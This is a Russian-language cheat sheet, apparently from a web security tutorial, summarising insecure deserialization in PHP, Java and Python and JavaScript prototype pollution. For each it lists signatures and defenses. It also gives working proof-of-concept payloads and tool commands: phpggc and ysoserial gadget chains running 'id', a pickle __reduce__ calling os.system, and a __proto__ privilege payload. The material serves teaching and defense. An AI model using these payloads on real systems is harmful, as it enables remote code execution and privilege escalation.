PHP Deserialization:
  Идентификация: O:4:"Name":1:{...}
  Magic methods:  __wakeup (при unserialize), __destruct (при уничтожении)
  Инструмент:     phpggc -b Framework/RCE1 system id
  Защита:         allowed_classes => false, HMAC подпись

Java Deserialization:
  Идентификация: AC ED 00 05 (hex) = rO0AB (base64)
  Инструмент:    ysoserial CommonsCollections6 'id'
  Защита:        Whitelist classes, Jackson вместо ObjectInputStream

Python Pickle:
  Идентификация: байты \x80\x04\x95...
  Payload:       class X: __reduce__ = lambda s: (os.system, ('id',))
  Защита:        Никогда не pickle из ненадёжных источников

Prototype Pollution (JS):
  Векторы:       __proto__, constructor.prototype
  Payload:       {"__proto__": {"isAdmin": true}}
  Защита:        Object.create(null), Object.freeze(Object.prototype)
```

### Дополнительные ресурсы

- [PayloadsAllTheThings — Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [phpggc GitHub](https://github.com/ambionics/phpggc)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [Prototype Pollution Research](https://portswigger.net/research/server-side-prototype-pollution)
- [HackTricks Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
